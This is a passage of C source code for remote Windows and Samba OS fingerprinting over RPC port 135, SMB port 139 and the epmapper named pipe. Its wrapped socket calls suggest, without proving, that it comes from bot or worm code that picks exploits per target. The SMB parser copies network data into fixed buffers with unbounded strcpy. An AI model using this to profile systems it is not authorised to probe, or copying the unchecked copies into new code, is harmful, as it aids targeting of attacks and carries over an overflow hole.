		IP = *((unsigned long *)pHE->h_addr_list[0]);	
	}

	return IP;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];
	    
			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;
	    
			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {	
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {	
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) { 
						fclosesocket(sSocket); 
						return iRetVal; 
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {	
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {	
							if(iErr<300) 
								iRetVal=OS_WINNT; 
							else 
								iRetVal=OS_WIN2K; 
						} else 
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN; 
					} else {	
						fclosesocket(sSocket); 
						return iRetVal; 
					} 
				} else {	
					fclosesocket(sSocket); 
					return iRetVal; 
				} 
			} else {	
				fclosesocket(sSocket); 
				return iRetVal; 
			}
			fclosesocket(sSocket); 
			return iRetVal; 
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	case FP_SMB:
		{
			// From THCsmbgetOS.c
			int iRetVal=OS_UNKNOWN, iRecvd;
			BOOL bOkToParse=FALSE;

			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	    
			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) 
				return OS_UNKNOWN;

			char szRecvBuf[8192];
			char sWorkgroup[512], sServer[512], sOS[512];

			SOCKADDR_IN ssin; 
			ZeroMemory(&ssin, sizeof(ssin)); 
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(139); 
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);
	    
			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {

				iErr=fsend(sSocket, sessionrequest, sizeof(sessionrequest)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=fsend(sSocket, negotiate, sizeof(negotiate)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				
				iErr=fsend(sSocket, setupaccount, sizeof(setupaccount)-1, 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) { 
					fclosesocket(sSocket); 
					return iRetVal; 
				}
				iRecvd=iErr;

				int iZeroCounter=0; iRecvd--;
				while((--iRecvd>0)&&(iZeroCounter<4))
				{
					if(szRecvBuf[iRecvd]==0x00)
					{
						switch(iZeroCounter)
						{
							case 0: strcpy(sWorkgroup,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 1: strcpy(sServer,(char*)&(szRecvBuf[iRecvd+1])); break;
							case 2: strcpy(sOS,(char*)&(szRecvBuf[iRecvd+1])); break;
							default: break;
						}
						iZeroCounter++;
					}
				}
				bOkToParse=TRUE;

			} else {
				return iRetVal;
			}
			fclosesocket(sSocket); 
#ifdef _DEBUG
			printf("sWorkgroup: %s\n",sWorkgroup);
			printf("sServer: %s\n",sServer);
			printf("sOS: %s\n",sOS);
#endif
			if(bOkToParse)
			{
				// Windows 2003 gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN1
				// Windows Server 2003 5.2
				// Windows Server 2003 3790
				if (wildcardfit("Windows Server 2003 *.*",sServer))
					return OS_WIN2K3;

				// Windows NT gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN2
				// NT LAN Manager 4.0
				// Windows NT 4.0
				if (wildcardfit("NT LAN Manager *.*",sServer))
					return OS_WINNT;

				// Windows 2k gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN3
				// Windows 2000 LAN Manager
				// Windows 5.0
				if (wildcardfit("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.0",sOS))
						return OS_WIN2K;
					
				// Windows XP gives me:
				// Remote OS:
				// ----------
				// WINDOMAIN4
				// Windows 2000 LAN Manager
				// Windows 5.1
				if (wildcardfit("Windows 2000 LAN Manager*",sServer))
					if (!strcmp("Windows 5.1",sOS))
						return OS_WINXP;

				// Samba gives me:
				// Remote OS:
				// ----------
				// SAMBADOMAIN1
				// Samba 2.0.7
				// Unix
				if (wildcardfit("Samba *",sServer))
					return OS_LINUX;
			}

			return iRetVal;
		}
		break;
	case FP_NP:
		{
			char szPipePath[MAX_PATH];
			int iRetVal=OS_UNKNOWN;
			//sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", szHost);
			_snprintf(szPipePath,sizeof(szPipePath),"\\\\%s\\",szHost);
			strncat(szPipePath,"pipe\\epmapper",sizeof(szPipePath));
			HANDLE hFile=CreateFile(szPipePath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);
			if(hFile!=INVALID_HANDLE_VALUE)
			{	
				//unsigned long lWritten;
				char *szInBuf=(char*)malloc(100000);
				memset(szInBuf, 0, 100000);
				
				DWORD dwRead;
				TransactNamedPipe(hFile, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, szInBuf, 10000, &dwRead, NULL);
				if(szInBuf[2]==DCE_PKT_BINDACK)
				{
					TransactNamedPipe(hFile, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1, szInBuf, 10000, &dwRead, NULL);
					if(szInBuf[2]==DCE_PKT_RESPONSE)
					{
						if (MemContains(szInBuf, dwRead, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
						{
							if(dwRead<300)
								iRetVal=OS_WINNT;
							else
								iRetVal=OS_WIN2K;
						}
						else if (MemContains(szInBuf, dwRead, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
							iRetVal=OS_WINXP;
						else
							iRetVal=OS_UNKNOWN;
					}
				}
				free(szInBuf);
				CloseHandle(hFile);
			}
			return iRetVal;
		}
		break;

	default:
		return OS_UNKNOWN;
		break; 
	}
	return OS_UNKNOWN;
}
#endif






